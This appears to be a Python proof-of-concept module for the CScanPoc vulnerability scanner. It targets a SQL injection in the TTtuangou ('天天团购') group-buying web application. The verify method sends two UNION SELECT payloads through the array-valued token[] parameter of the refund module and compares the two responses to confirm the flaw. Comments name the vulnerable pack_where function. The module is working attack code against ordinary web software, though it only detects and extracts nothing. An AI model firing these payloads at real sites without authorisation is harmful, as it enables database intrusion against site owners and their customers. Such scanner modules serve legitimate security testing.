# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TTtuangou_0001'  # 平台漏洞编号，留空
    name = '天天团购 SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-04'  # 漏洞公布时间
    desc = '''
        include\driver\database\mysql_max.php(308):
        //pack_where函数负责组装sql查询语句where条件部分，
        如果可以传入数组，并进入where条件，经过pack_where组装成语句后，就能形成sql注射了。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3256/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天天团购'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2bf48984-be69-473f-9ad2-ff3e808a5a40'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # //返回页面：订单信息错误!
            payload1 = "/?mod=refund&appcode=xxoo&token[]=%3d-1%20union%20select%201,1,1,1,1,1"
            # //返回页面：请先登录！
            payload2 = "/?mod=refund&appcode=xxoo&token[]=%3d-1%20union%20select%201,1,1,0,1,1 "
            url1 = self.target + payload1
            url2 = self.target + payload2
            r1 = requests.get(url1)
            r2 = requests.get(url2)

            if r1.text != r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
